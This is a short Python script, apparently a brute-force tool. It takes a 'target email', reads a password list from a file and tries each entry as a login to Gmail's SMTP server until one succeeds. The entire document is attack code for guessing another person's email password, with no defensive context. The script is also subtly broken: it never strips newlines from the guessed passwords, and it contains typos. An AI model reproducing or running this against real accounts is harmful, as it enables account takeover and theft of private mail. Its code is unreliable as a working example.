import smtplib
server_logan = smtplib.SMTP("smtp.gmail.com", 587)
server_logan.ehlo()
server_logan.starttls()
user = input("inter target email : ")
passwordfile = input("inter file name : ")
passwordfile = open(passwordfile, "r")
for password in passwordfile :
    try :
        server_logan.login(user, password)
        print("[+] password found ==> " +password)
        break;  
    except smtplib.SMTPAuthenticationError:
        print("[!] password not found ==>" +password)
